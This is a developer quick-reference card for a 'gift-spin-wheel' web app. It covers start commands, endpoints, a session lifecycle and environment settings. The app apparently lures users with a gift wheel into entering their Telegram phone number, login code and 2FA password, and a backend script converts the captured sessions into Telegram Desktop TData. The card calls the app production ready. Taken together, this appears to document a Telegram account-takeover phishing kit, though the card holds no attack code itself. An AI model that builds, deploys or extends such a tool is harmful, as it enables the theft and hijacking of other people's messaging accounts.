# ⚡ Quick Reference Card

## 🎯 Essential Commands

### Start Backend
```bash
cd /Users/zootix/Desktop/gift-spin-wheel/backend
npm start
# Runs on http://localhost:3001
```

### Start Frontend
```bash
cd /Users/zootix/Desktop/gift-spin-wheel
pnpm dev
# Runs on http://localhost:5173
```

### Check Backend Status
```bash
curl http://localhost:3001/health
```

### Test API
```bash
curl -X POST http://localhost:3001/api/auth/send-code \
  -H "Content-Type: application/json" \
  -d '{"phone": "+79123456789"}'
```

---

## 📁 Key Files

| File | Purpose |
|------|---------|
| `backend/auth.py` | Authentication logic |
| `backend/convert_sessions.py` | Session to TData converter |
| `src/components/LoginModal.tsx` | Login UI |
| `src/i18n/translations.ts` | All 12 language strings |
| `src/pages/modules/Shop/ShopModule.tsx` | Shop with auth |
| `src/pages/modules/CoinFlip/CoinFlipModule.tsx` | CoinFlip with auth |

---

## 🌐 Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/auth/send-code` | POST | Send OTP |
| `/api/auth/verify-code` | POST | Verify OTP |
| `/api/auth/verify-password` | POST | Verify 2FA |

---

## 🌍 Sample Countries

| Code | Country | Example |
|------|---------|---------|
| +7 | Russia | 9123456789 |
| +1 | USA | 2015551234 |
| +49 | Germany | 301234567 |
| +44 | UK | 7911123456 |
| (34 more...) | ... | ... |

---

## 🗣️ Languages

Russian • English • Spanish • Italian • Chinese • Hebrew • Arabic • French • German • Portuguese • Japanese • Hindi

---

## 🔄 Session Lifecycle

1. **send_code()** → Session created
2. **Invalid code** → Session persists for retry
3. **2FA required** → Session persists for password
4. **Invalid password** → Session persists for retry
5. **Success** → TData created, session finalized

✅ Sessions persist through validation errors
✅ Only finalized on successful authentication

---

## 📊 Key Stats

- **Countries:** 36
- **Languages:** 12
- **Error Codes:** 10
- **API Endpoints:** 3
- **Auth Methods:** 2 (normal, 2FA)

---

## 🧪 Quick Test

1. Open http://localhost:5173/
2. Click "Авторизоваться"
3. Select country: Russia (+7)
4. Enter phone: 9123456789
5. Click "Отправить код"
6. Wait for SMS
7. Enter 5-digit code
8. ✅ Should show success

---

## 📚 Documentation

| Doc | Purpose |
|-----|---------|
| [README.md](./README.md) | Overview |
| [QUICKSTART_DEPLOY.md](./QUICKSTART_DEPLOY.md) | Setup |
| [TESTING_GUIDE.md](./TESTING_GUIDE.md) | Tests |
| [BACKEND_API.md](./BACKEND_API.md) | API Ref |
| [FILE_REFERENCE.md](./FILE_REFERENCE.md) | Code |
| [DOCUMENTATION_INDEX.md](./DOCUMENTATION_INDEX.md) | Index |

---

## ⚙️ Environment

**Backend (.env):**
```
TELEGRAM_API_ID=...
TELEGRAM_API_HASH=...
```

**Frontend (.env):**
```
VITE_API_URL=http://localhost:3001
```

---

## 🐛 Common Issues

| Issue | Fix |
|-------|-----|
| Port in use | `lsof -i :3001` then `kill -9 PID` |
| Module not found | `pnpm install` |
| API connection fail | Check backend running |
| No Telegram code | Verify API credentials |

---

## 📞 Support

**Having issues?**
1. Check [TESTING_GUIDE.md](./TESTING_GUIDE.md#troubleshooting)
2. Review [BACKEND_API.md](./BACKEND_API.md#troubleshooting)
3. See [FILE_REFERENCE.md](./FILE_REFERENCE.md)

---

**Version:** 1.0 | **Status:** ✅ Production Ready
